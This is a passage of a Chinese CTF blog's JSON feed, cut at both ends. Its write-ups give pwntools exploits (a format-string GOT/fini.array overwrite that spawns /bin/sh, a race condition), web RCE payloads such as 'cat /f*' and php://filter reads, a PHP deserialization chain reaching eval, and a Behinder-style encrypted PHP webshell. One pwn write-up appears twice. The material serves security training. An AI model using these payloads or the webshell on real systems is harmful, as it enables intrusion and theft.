keyword\">def</span> <span class=\"token function\">get_flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    rodata <span class=\"token operator\">=</span> <span class=\"token string\">\"SXAxS6jd8doTxBQ&#123;x\\\"Ma',27h,'csE-|El,o/&#123;^\\\\\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    flag <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rodata<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>rodata<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> flag</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_flag<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"幸运数字\"><a class=\"markdownIt-Anchor\" href=\"#幸运数字\">#</a> 幸运数字</h3>\n<p>直接写个脚本，往程序循环加一输入数字，能得到 flag</p>\n<h3 id=\"砍树\"><a class=\"markdownIt-Anchor\" href=\"#砍树\">#</a> 砍树</h3>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/13.png\" alt=\"image-20231030090452684\"></p>\n<p>key:Syclove</p>\n<p>加密算法：</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/14.png\" alt=\"image-20231030090659388\"></p>\n<pre><code>002020171B360E362617042A2907261552332D0F3A271106330746173D0A3C382E2218\n</code></pre>\n<p>解题脚本：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">A0OWO0A</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> a2<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> a1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>a1 <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token string\">'002020171B360E362617042A2907261552332D0F3A271106330746173D0A3C382E2218'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>a2 <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token string\">b'Syclove'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>result <span class=\"token operator\">=</span> A0OWO0A<span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/09/22/new-pwn/",
            "url": "https://yhuanhuan01.github.io/2023/09/22/new-pwn/",
            "title": "new_pwn",
            "date_published": "2023-09-22T12:04:31.000Z",
            "content_html": "<h1 id=\"记录两道pwn题\"><a class=\"markdownIt-Anchor\" href=\"#记录两道pwn题\">#</a> 记录两道 PWN 题</h1>\n<blockquote>\n<p>给新生出题，出累了，随便看了两个 PWN 题，发现这两个 PWN 都值得记录一下</p>\n</blockquote>\n<ul>\n<li>ONE</li>\n</ul>\n<h2 id=\"nisactf-2022shop_pwn\"><a class=\"markdownIt-Anchor\" href=\"#nisactf-2022shop_pwn\">#</a> [NISACTF 2022]shop_pwn</h2>\n<p>题目标签：</p>\n<p><img data-src=\"/img/pwnlianxi/20230922180317483.png\" alt=\"20230922180317483\"></p>\n<blockquote>\n<p>pthread_create 多线程竞争</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxi/20230922180537307.png\" alt=\"20230922180537307\"></p>\n<p><strong>执行程序如下：</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922180732045.png\" alt=\"20230922180732045\"></p>\n<p><strong>放入 IDA 看一下具体的函数：</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922180849649.png\" alt=\"20230922180849649\"></p>\n<p><strong>看一下主要的函数</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181202034.png\" alt=\"20230922181202034\"></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181325444.png\" alt=\"20230922181325444\"></p>\n<p><strong>脚本如下：</strong></p>\n<blockquote>\n<p>这里利用了 pthread_create 创建进程，那么如果我们指令发送得快的话，那么就可以实现第一次售卖功能执行的时候正在 unsleep，接着执行第二次售卖功能，那么就能卖出两次得到可以购买 flag 的金钱了</p>\n</blockquote>\n<p><strong>pwntool 的 sendline 发送指令很快</strong></p>\n<pre><code>from pwn import *\ncontext(log_level='debug',arch='amd64', os='linux')\nr = remote('node5.anna.nssctf.cn',28929)\nr.sendline(&quot;3&quot;) \nr.sendline(&quot;0&quot;) \n\nr.sendline(&quot;3&quot;)\nr.sendline(&quot;0&quot;)  \n\nr.interactive()\n</code></pre>\n<p><strong>结果如下：</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181643187.png\" alt=\"20230922181643187\"></p>\n<ul>\n<li>two</li>\n</ul>\n<h2 id=\"ciscn-2019西南pwn1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2019西南pwn1\">#</a> [CISCN 2019 西南] PWN1</h2>\n<blockquote>\n<p>当 <code>RELRO</code>  保护为 <code>NO RELRO</code>  的时候， <code>init.array、fini.array、got.plt</code>  均可读可写；为 <code>PARTIAL RELRO</code>  的时候， <code>ini.array、fini.array</code>  可读不可写， <code>got.plt</code>  可读可写；为 <code>FULL RELRO</code>  时， <code>init.array、fini.array、got.plt</code>  均可读不可写。</p>\n</blockquote>\n<blockquote>\n<p>程序在加载的时候，会依次调用 <code>init.array</code>  数组中的每一个函数指针，在结束的时候，依次调用 <code>fini.array</code>  中的每一个函数指针</p>\n</blockquote>\n<blockquote>\n<p>当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写 <code>fini.array</code>  中的函数指针为 <code>main</code>  函数地址，可以再执行一次 <code>main</code>  函数。一般来说，这个数组的长度为 <code>1</code> ，也就是说只能写一个地址。</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxi/20230922182614061.png\" alt=\"20230922182614061\"></p>\n<p>32 位程序修改 got 表。</p>\n<p><strong>执行程序参看偏移：</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922183714065.png\" alt=\"20230922183714065\"></p>\n<p><strong>看一下 IDA:</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922184018564.png\" alt=\"20230922184018564\"></p>\n<p><img data-src=\"/img/pwnlianxi/20230922184142420.png\" alt=\"20230922184142420\"></p>\n<p><strong>利用思路：</strong></p>\n<p>通过格式化字符串漏洞去修改 printf_got，修改为 system。但是程序只能执行一次，所以修改完后，程序会退出。</p>\n<p>但是如果如下图所示</p>\n<p><img data-src=\"/img/pwnlianxi/20230922184525768.png\" alt=\"20230922184525768\"></p>\n<p>我们就可以去修改 <code>fini.array</code> , 将其参数 1，给覆写成 main，那么程序在退出后就会再次执行 main 函数。</p>\n<p><strong>payload：</strong></p>\n<blockquote>\n<p>payload = b&quot;%2052c%13<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">hn%31692c%14</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">n</span></span></span></span>hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)</p>\n</blockquote>\n<p>通过 gdb 去看一眼 payload 进入程序的情况：</p>\n<p><img data-src=\"/img/pwnlianxi/20230922185014496.png\" alt=\"20230922185014496\"></p>\n<p>当读入 pyload 时的情况</p>\n<p>这时程序读入 payload。现在 got 表项指向的还是 printf_plt。</p>\n<p><img data-src=\"/img/pwnlianxi/20230922191625014.png\" alt=\"20230922191625014\"></p>\n<p>当执行到 printf 函数时，printf_got 修改为 system  fini_array 的第一个参数修改为 main</p>\n<p>当我们程序结束时，就会再次跳转到 main 函数入口，在读入 /bin/sh，接着会在调用 printf 函数，会执行 system (/bin/sh)，从而获取 shell</p>\n<p><strong>exp 如下：</strong></p>\n<pre><code>from pwn import *\nr = remote('node5.anna.nssctf.cn',28467)\n# r = gdb.debug(&quot;./XNPWN1&quot;)\n# 往fini.array[0]写main@text, printf@got写system@plt\npayload = b&quot;%2052c%13$hn%31692c%14$hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)\nr.recvline()\n\nr.sendline(payload)\n\nr.sendline(&quot;/bin/sh&quot;)\nr.interactive()\n</code></pre>\n",
            "tags": [
                "格式化字符串",
                "got表"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/09/22/picture/new-pwn/",
            "url": "https://yhuanhuan01.github.io/2023/09/22/picture/new-pwn/",
            "title": "new_pwn",
            "date_published": "2023-09-22T11:51:06.000Z",
            "content_html": "<h1 id=\"记录两道pwn题\"><a class=\"markdownIt-Anchor\" href=\"#记录两道pwn题\">#</a> 记录两道 PWN 题</h1>\n<blockquote>\n<p>给新生出题，出累了，随便看了两个 PWN 题，发现这两个 PWN 都值得记录一下</p>\n</blockquote>\n<ul>\n<li>ONE</li>\n</ul>\n<h2 id=\"nisactf-2022shop_pwn\"><a class=\"markdownIt-Anchor\" href=\"#nisactf-2022shop_pwn\">#</a> [NISACTF 2022]shop_pwn</h2>\n<p>题目标签：</p>\n<p><img data-src=\"/img/pwnlianxi/20230922180317483.png\" alt=\"20230922180317483\"></p>\n<blockquote>\n<p>pthread_create 多线程竞争</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxi/20230922180537307.png\" alt=\"20230922180537307\"></p>\n<p><strong>执行程序如下：</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922180732045.png\" alt=\"20230922180732045\"></p>\n<p><strong>放入 IDA 看一下具体的函数：</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922180849649.png\" alt=\"20230922180849649\"></p>\n<p><strong>看一下主要的函数</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181202034.png\" alt=\"20230922181202034\"></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181325444.png\" alt=\"20230922181325444\"></p>\n<p><strong>脚本如下：</strong></p>\n<blockquote>\n<p>这里利用了 pthread_create 创建进程，那么如果我们指令发送得快的话，那么就可以实现第一次售卖功能执行的时候正在 unsleep，接着执行第二次售卖功能，那么就能卖出两次得到可以购买 flag 的金钱了</p>\n</blockquote>\n<p><strong>pwntool 的 sendline 发送指令很快</strong></p>\n<pre><code>from pwn import *\ncontext(log_level='debug',arch='amd64', os='linux')\nr = remote('node5.anna.nssctf.cn',28929)\nr.sendline(&quot;3&quot;) \nr.sendline(&quot;0&quot;) \n\nr.sendline(&quot;3&quot;)\nr.sendline(&quot;0&quot;)  \n\nr.interactive()\n</code></pre>\n<p><strong>结果如下：</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181643187.png\" alt=\"20230922181643187\"></p>\n<ul>\n<li>two</li>\n</ul>\n<h2 id=\"ciscn-2019西南pwn1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2019西南pwn1\">#</a> [CISCN 2019 西南] PWN1</h2>\n<blockquote>\n<p>当 <code>RELRO</code>  保护为 <code>NO RELRO</code>  的时候， <code>init.array、fini.array、got.plt</code>  均可读可写；为 <code>PARTIAL RELRO</code>  的时候， <code>ini.array、fini.array</code>  可读不可写， <code>got.plt</code>  可读可写；为 <code>FULL RELRO</code>  时， <code>init.array、fini.array、got.plt</code>  均可读不可写。</p>\n</blockquote>\n<blockquote>\n<p>程序在加载的时候，会依次调用 <code>init.array</code>  数组中的每一个函数指针，在结束的时候，依次调用 <code>fini.array</code>  中的每一个函数指针</p>\n</blockquote>\n<blockquote>\n<p>当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写 <code>fini.array</code>  中的函数指针为 <code>main</code>  函数地址，可以再执行一次 <code>main</code>  函数。一般来说，这个数组的长度为 <code>1</code> ，也就是说只能写一个地址。</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxi/20230922182614061.png\" alt=\"20230922182614061\"></p>\n<p>32 位程序修改 got 表。</p>\n<p><strong>执行程序参看偏移：</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922183714065.png\" alt=\"20230922183714065\"></p>\n<p><strong>看一下 IDA:</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922184018564.png\" alt=\"20230922184018564\"></p>\n<p><img data-src=\"/img/pwnlianxi/20230922184142420.png\" alt=\"20230922184142420\"></p>\n<p><strong>利用思路：</strong></p>\n<p>通过格式化字符串漏洞去修改 printf_got，修改为 system。但是程序只能执行一次，所以修改完后，程序会退出。</p>\n<p>但是如果如下图所示</p>\n<p><img data-src=\"/img/pwnlianxi/20230922184525768.png\" alt=\"20230922184525768\"></p>\n<p>我们就可以去修改 <code>fini.array</code> , 将其参数 1，给覆写成 main，那么程序在退出后就会再次执行 main 函数。</p>\n<p><strong>payload：</strong></p>\n<blockquote>\n<p>payload = b&quot;%2052c%13<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">hn%31692c%14</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">n</span></span></span></span>hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)</p>\n</blockquote>\n<p>通过 gdb 去看一眼 payload 进入程序的情况：</p>\n<p><img data-src=\"/img/pwnlianxi/20230922185014496.png\" alt=\"20230922185014496\"></p>\n<p>当读入 pyload 时的情况</p>\n<p>这时程序读入 payload。现在 got 表项指向的还是 printf_plt。</p>\n<p><img data-src=\"/img/pwnlianxi/20230922191625014.png\" alt=\"20230922191625014\"></p>\n<p>当执行到 printf 函数时，printf_got 修改为 system  fini_array 的第一个参数修改为 main</p>\n<p>当我们程序结束时，就会再次跳转到 main 函数入口，在读入 /bin/sh，接着会在调用 printf 函数，会执行 system (/bin/sh)，从而获取 shell</p>\n<p><strong>exp 如下：</strong></p>\n<pre><code>from pwn import *\nr = remote('node5.anna.nssctf.cn',28467)\n# r = gdb.debug(&quot;./XNPWN1&quot;)\n# 往fini.array[0]写main@text, printf@got写system@plt\npayload = b&quot;%2052c%13$hn%31692c%14$hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)\nr.recvline()\n\nr.sendline(payload)\n\nr.sendline(&quot;/bin/sh&quot;)\nr.interactive()\n</code></pre>\n",
            "tags": [
                "格式化字符串",
                "got表"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/09/10/sictf-wp/",
            "url": "https://yhuanhuan01.github.io/2023/09/10/sictf-wp/",
            "title": "sictf_wp",
            "date_published": "2023-09-10T11:48:34.000Z",
            "content_html": "<h1 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h1>\n<h3 id=\"签到welcome\"><a class=\"markdownIt-Anchor\" href=\"#签到welcome\">#</a> 签到] Welcome</h3>\n<p><img data-src=\"/img/sictfpic/1.png\" alt=\"img\"></p>\n<h3 id=\"pixel_art\"><a class=\"markdownIt-Anchor\" href=\"#pixel_art\">#</a> Pixel_art</h3>\n<pre><code class=\"language-PHP\">from PIL import Image\nimage = Image.open('image.png')\nwidth, height = image.size\nfor y in range(height):\n    for x in range(width):\n        r, g, b = image.getpixel((x, y))\n        if r == 46:\n            print('.',end=&quot;&quot;)\n        elif r == 33:\n            print('!',end=&quot;&quot;)\n        elif r == 63:\n            print('?',end=&quot;&quot;)\n        if g == 46:\n                print('.',end=&quot;&quot;)\n        elif g == 33:\n                print('!',end=&quot;&quot;)\n        elif g == 63:\n                print('?',end=&quot;&quot;)\n        if b == 46:\n            print('.',end=&quot;&quot;)\n        elif b == 33:\n            print('!',end=&quot;&quot;)\n        elif b == 63:\n            print('?',end=&quot;&quot;)\n</code></pre>\n<pre><code class=\"language-aspn\n Ook\n</code></pre>\n<h3 id=\"baby_zip\"><a class=\"markdownIt-Anchor\" href=\"#baby_zip\">#</a> baby_zip</h3>\n<pre><code class=\"language-PHP\">bkcrack -C flag.zip -c flag.png -x 0 89504E470D0A1A0A0000000D49484452\nbkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png\n</code></pre>\n<p>010 查看 flag 在最后</p>\n<h3 id=\"easy_shark\"><a class=\"markdownIt-Anchor\" href=\"#easy_shark\">#</a> Easy_Shark</h3>\n<p>AES 冰蝎 3 流量的特征</p>\n<pre><code class=\"language-PHP\">&lt;?php\n@error_reporting(0);\nsession_start();\n    $key=&quot;2295d22e2d70888f&quot;;\n        $_SESSION['k']=$key;\n        $post=file_get_contents(&quot;php://input&quot;);\n        if(!extension_loaded('openssl'))\n        &#123;\n                $t=&quot;base64_&quot;.&quot;decode&quot;;\n                $post=$t($post.&quot;&quot;);\n                \n                for($i=0;$i&lt;strlen($post);$i++) &#123;\n                             $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n                            &#125;\n        &#125;\n        else\n        &#123;\n                $post=openssl_decrypt($post, &quot;AES128&quot;, $key);\n        &#125;\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n        class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;\n    @call_user_func(new C(),$params);\n?&gt;\nkey = '2295d22e2d70888f'\n</code></pre>\n<p><img data-src=\"/img/sictfpic/2.png\" alt=\"img\"></p>\n<p>解冰蝎流量</p>\n<p><img data-src=\"/img/sictfpic/3.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/4.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/5.png\" alt=\"img\"></p>\n<p>Gron 解密</p>\n<pre><code class=\"language-PHP\">def decrypt_string(ciphertext, offsets):\n    decrypted_string = &quot;&quot;\n    offset_index = 0\n\n    for char in ciphertext:\n        offset = offsets[offset_index] % 26\n        decrypted_char_code = (ord(char) - ord('A') - offset) % 26 + ord('A')\n        decrypted_char = chr(decrypted_char_code)\n        decrypted_string += decrypted_char\n\n        offset_index = (offset_index + 1) % len(offsets)\n\n    return decrypted_string\n\nciphertext = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;\noffsets = [1, 50, 61, 8, 9, 20, 63, 41]\n\nwhile True:\n    decrypted_string = decrypt_string(ciphertext, offsets)\n    print(decrypted_string)\n</code></pre>\n<h3 id=\"fast_morse\"><a class=\"markdownIt-Anchor\" href=\"#fast_morse\">#</a> fast_morse</h3>\n<p>morse 解密</p>\n<p><img data-src=\"/img/sictfpic/6.png\" alt=\"img\"></p>\n<p>得到 falg</p>\n<p><img data-src=\"/img/sictfpic/7.png\" alt=\"img\"></p>\n<p>变成小写</p>\n<p>flag:SICTF f2a098f-7f4a-93a5-c8a48360b03c}</p>\n<h3 id=\"qr_qr_qr\"><a class=\"markdownIt-Anchor\" href=\"#qr_qr_qr\">#</a> QR_QR_QR</h3>\n<pre><code class=\"language-Python\">import numpy as np\nimport matplotlib.pyplot as plt\nfrom pyzbar.pyzbar import decode\nfrom PIL import Image\nfrom pwn import *\n\n# 设置日志级别为调试模式\ncontext(log_level='debug')\n\n# 创建图片函数\ndef create_image(file_path):\n    with open(file_path, 'r') as file:\n        lines = file.readlines()\n\n    # 生成图片数组\n    image_array = [[255 if bit == '1' else 0 for bit in line.strip()] for line in lines]\n    image_array = np.array(image_array, dtype=np.uint8)\n\n    # 保存为图片\n    plt.imsave('output.png', image_array, cmap='gray')\n\n# 读取二维码函数\ndef read_qr_code(image_path):\n    image = Image.open(image_path)\n    decoded_objects = decode(image)\n    for obj in decoded_objects:\n        return obj.data.decode('utf-8')\n\n# 连接服务器\nconn = remote('210.44.151.51', 10523)\n\nwhile True:\n    try:\n        # 从服务器接收数据\n        data = conn.recvuntil('Please Decrypt this QR code:', drop=True)\n\n        # 将数据保存到文本文件\n        with open('1.txt', 'w') as file:\n            file.write(data.decode())\n\n        # 从文本文件创建图片\n        create_image('1.txt')\n\n        # 读取图片中的二维码\n        code = read_qr_code('output.png')\n        print(code)\n\n        # 发送二维码到服务器\n        conn.sendline(str(code))\n        conn.recvline()\n    finally:\n        # 关闭文件\n        file.close()\n</code></pre>\n<h3 id=\"问卷调查\"><a class=\"markdownIt-Anchor\" href=\"#问卷调查\">#</a> 问卷调查</h3>\n<p>第三道就是 flag</p>\n<p>SICTF SICTF_Round3_will_do_even_better!}</p>\n<h1 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> WEB</h1>\n<h3 id=\"签到include\"><a class=\"markdownIt-Anchor\" href=\"#签到include\">#</a> [签到] Include</h3>\n<p>利用伪协议可直接读到 flag</p>\n<pre><code class=\"language-Python\">    /?SICTF=php://filter/convert.base64-encode/resource=/flag\n</code></pre>\n<h3 id=\"baby_php\"><a class=\"markdownIt-Anchor\" href=\"#baby_php\">#</a> Baby_PHP</h3>\n<pre><code class=\"language-PHP\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\n$query = $_SERVER['QUERY_STRING'];\n\nif (preg_match('/_|%5f|\\.|%2E/i', $query)) &#123;\n    die('You are Hacker!');\n&#125;\nif($_GET['k_e_y'] !=='123' &amp;&amp; preg_match('/^123$/',$_GET['k_e_y']))&#123;\n    echo(&quot;You are will Win!&lt;br&gt;&quot;);\n    if(isset($_POST['command']))&#123;\n        $command = $_POST['command'];\n        if(!preg_match(&quot;/\\~|\\`|\\@|\\#|\\\\$|\\%|\\&amp;|\\*|\\（|\\）|\\-|\\+|\\=|\\&#123;|\\&#125;|\\[|\\]|\\:|\\'|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;,$command))&#123;\n            eval($command);\n        &#125;\n        else&#123;\n            echo(&quot;You are Hacker!&quot;);\n        &#125;\n    &#125;\n&#125;\nelse&#123;\n    echo(&quot;K_e_y is Errors!&quot;);\n&#125;K_e_y is Errors!\n</code></pre>\n<p>代码开始会对输入的字符串进行正则匹配，跟_有关的 url 编码之类的全部过滤</p>\n<p>可以用空格或者。代替_,. 又被过滤了，用了空格，后面一个简单的若比较换行符绕过</p>\n<p>后面 cmd 一个无数字字母 rce</p>\n<p>可见 ctfshow  web40 的题解</p>\n<pre><code class=\"language-Plain\">/?k%20e%20y=123%0a\ncommand=show_source(next(array_reverse(scandir(pos(localeconv())))));\n</code></pre>\n<h3 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> RCE</h3>\n<pre><code class=\"language-Plain\">&lt;?php \nerror_reporting(0); \nhighlight_file(__FILE__); \n$code = $_POST['code']; \n$code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code); \n$code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code); \neval($code); \n?&gt;\n</code></pre>\n<p>借鉴宏爷文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYzOTI4Nzk2L2FydGljbGUvZGV0YWlscy8xMjc5NjMwNzk=\">https://blog.csdn.net/qq_63928796/article/details/127963079</span></p>\n<pre><code class=\"language-PHP\">code=echo $_POST[1];&amp;1=cat /f*\n</code></pre>\n<h3 id=\"我全都要\"><a class=\"markdownIt-Anchor\" href=\"#我全都要\">#</a> 我全都要</h3>\n<p>POP</p>\n<pre><code class=\"language-PHP\">&lt;?php\nhighlight_file(__FILE__);\n\nclass B&#123;\n    public $pop = '233333333';\n    public $i = '1';\n    public $nogame;\n\n    public function __destruct()\n    &#123;\n        if(preg_match(&quot;/233333333/&quot;,$this-&gt;pop))&#123;\n            echo &quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;;\n        &#125;\n    &#125;\n\n    public function game()&#123;\n        echo &quot;扣1送地狱火&quot;;\n        if ($this-&gt;i = &quot;1&quot;)&#123;\n            echo '&lt;img src=\\'R.jpg\\'&gt;';\n            $this-&gt;nogame-&gt;love();\n        &#125;\n    &#125;\n\n    public function __clone()&#123;\n        echo &quot;必须执行&quot;;\n        eval($_POST[&quot;cmd&quot;]);\n    &#125;\n&#125;\n\n\nclass A&#123;\n    public $Aec;\n    public $girl = 'QNKCDZO' ;\n    public $boy = '240610708';\n\n    public function __toString()\n    &#123;\n        echo &quot;I also want to fall in love&quot;;\n        if($this-&gt;girl != $this-&gt;boy &amp;&amp; md5($this-&gt;girl) == md5($this-&gt;boy))&#123;\n            $this-&gt;Aec-&gt;game();\n        &#125;\n    &#125;\n\n\n&#125;\n\n\nclass P&#123;\n    public $MyLover;\n    public $name = '1';\n    public function __call($name, $arguments)\n    &#123;\n        echo &quot;有对象我会在这打CTF???看我克隆一个对象！&quot;;\n        if ($name != &quot;game&quot;) &#123;\n            echo &quot;打游戏去，别想着对象了&quot;;\n            $this-&gt;MyLover = clone new B;\n        &#125;\n    &#125;\n\n\n&#125;\n$a = new B();\n$a -&gt;pop = new A();\n$a -&gt;pop -&gt;Aec = new B();\n$a -&gt;pop -&gt;Aec -&gt; nogame = new P();\necho serialize($a);\n</code></pre>\n<p>然后命令执行</p>\n<p>cmd=</p>\n<h3 id=\"你能跟得上我的speed吗\"><a class=\"markdownIt-Anchor\" href=\"#你能跟得上我的speed吗\">#</a> 你能跟得上我的 speed 吗</h3>\n<p>条件竞争</p>\n<p>准备一个 php 文件</p>\n<p>内容为</p>\n<pre><code>&lt;?php @eval(system(&quot;cat /flag&quot;));?&gt;\n</code></pre>\n<p>抓两个包</p>\n<p>一个为 get 传参的包，访问 url/uploads/2.php, 抓包</p>\n<p>另一个为 post 包，直接就抓上传的包，如下</p>\n<p><img data-src=\"/img/sictfpic/8.png\" alt=\"img\"></p>\n<p>俩个包用 burp 爆破，爆破方式为 noplayload，开跑</p>\n<p><img data-src=\"/img/sictfpic/9.png\" alt=\"img\"></p>\n<h1 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> Re</h1>\n<h3 id=\"签到pyc\"><a class=\"markdownIt-Anchor\" href=\"#签到pyc\">#</a> [签到] PYC</h3>\n<p><img data-src=\"/img/sictfpic/10.png\" alt=\"img\"></p>\n<h3 id=\"myobject\"><a class=\"markdownIt-Anchor\" href=\"#myobject\">#</a> Myobject</h3>\n<p>动调出数据，直接赛博厨子秒了</p>\n<p><img data-src=\"/img/sictfpic/11.png\" alt=\"img\"></p>\n<h3 id=\"chbase\"><a class=\"markdownIt-Anchor\" href=\"#chbase\">#</a> chbase</h3>\n<p>换表加密</p>\n<p><img data-src=\"/img/sictfpic/12.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/13.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/14.png\" alt=\"img\"></p>\n<h3 id=\"不一样的base64\"><a class=\"markdownIt-Anchor\" href=\"#不一样的base64\">#</a> 不一样的 base64</h3>\n<pre><code class=\"language-Java\">BASE64_CHARS = 